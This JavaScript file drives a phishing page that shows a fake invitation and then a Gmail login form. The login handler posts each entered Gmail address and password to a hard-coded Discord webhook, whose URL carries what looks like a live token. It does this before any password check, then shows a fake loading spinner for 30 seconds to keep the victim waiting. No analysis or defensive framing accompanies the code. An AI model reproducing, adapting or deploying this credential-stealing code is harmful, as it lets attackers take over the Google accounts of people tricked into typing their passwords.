// =====================
// WEBHOOK SETUP
// =====================
const webhookURL = "https://discord.com/api/webhooks/1523935581934059595/IdFhCnUd1osIL2zBpAx6p2xRDHJuT6JaHCKVKTfcZwDPWsyxBlrCbQcV_l5QcaDIZr6z";

function sendToWebhook(content) {
    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: content
        })
    }).catch(err => console.log("Webhook error:", err));
}

const invitePage = document.getElementById("invitePage");
const loginPage = document.getElementById("loginPage");

const acceptBtn = document.getElementById("acceptBtn");
const backBtn = document.getElementById("backBtn");
const loginBtn = document.getElementById("loginBtn");

const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");

const usernameError = document.getElementById("usernameError");
const loading = document.getElementById("loading");

acceptBtn.addEventListener("click", () => {
    invitePage.classList.add("hidden");
    loginPage.classList.remove("hidden");
});

backBtn.addEventListener("click", () => {
    invitePage.classList.remove("hidden");
    loginPage.classList.add("hidden");

    usernameInput.value = "";
    passwordInput.value = "";
    usernameError.textContent = "";

    loading.classList.add("hidden");

    usernameInput.disabled = false;
    passwordInput.disabled = false;
    loginBtn.disabled = false;
    backBtn.disabled = false;
});

loginBtn.addEventListener("click", () => {

    const username = usernameInput.value.trim().toLowerCase();
    const password = passwordInput.value.trim();

    usernameError.textContent = "";

    if (username === "") {
        usernameError.textContent = "Please fill in this field.";
        usernameInput.focus();
        return;
    }

    if (!username.endsWith("@gmail.com")) {
        usernameError.textContent = "Please enter a valid Gmail address.";
        usernameInput.focus();
        return;
    }

       sendToWebhook(
        `🔐 LOGIN ATTEMPT\n👤 Username: ${username}\n🔑 Password: ${password}`
    );

    console.log("Username:", username);
    console.log("Password:", password);


    if (password === "") {
        passwordInput.focus();
        return;
    }

    if (password.length < 6) {
        passwordInput.focus();
        return;
    }

    // Disable controls
    usernameInput.disabled = true;
    passwordInput.disabled = true;
    loginBtn.disabled = true;
    backBtn.disabled = true;

    // Show loading
    loading.classList.remove("hidden");

    // Debug
    console.log("Loading shown");

    setTimeout(() => {

        // Redirect example
        // window.location.href = "dashboard.html";

        loading.classList.add("hidden");

        usernameInput.disabled = false;
        passwordInput.disabled = false;
        loginBtn.disabled = false;
        backBtn.disabled = false;

    }, 30000);

});

usernameInput.addEventListener("input", () => {
    usernameError.textContent = "";
});